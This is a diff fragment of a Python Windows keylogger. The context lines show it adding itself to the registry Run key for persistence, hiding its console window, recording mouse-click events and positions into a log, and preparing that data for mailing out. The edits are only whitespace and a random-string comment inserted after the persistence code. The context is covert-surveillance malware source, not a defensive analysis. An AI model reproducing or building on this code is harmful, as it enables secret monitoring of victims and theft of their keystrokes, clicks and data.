@@ -52,7 +52,7 @@ def addStartup(): # this will add the file to the startup registry key
     keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
     key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
     SetValueEx (key2change, 'Howcelmzexpla27831910', 0, REG_SZ, new_file_path)
-
+                            #gDHwodhqoueSsfa42393t
 def Hide():
     import win32console
     import win32gui
@@ -100,7 +100,7 @@ def Mail_it(data, pics_names):
             data += '\n\ tButton :' + str(event.MessageName)
             data += '\n\tClicked in (Position):' + str(event.Position)
             data += '\n==================='
-            global t, start_time, pics_names   
+            global t, start_time, pics_names
             ####Line 105###
             t = t + data
 
@@ -164,7 +164,7 @@ while True:
 
 # releases vid writer
 out.release()
-  
+
 #Remove all windows
 cv2.destroyAllWindows()
 
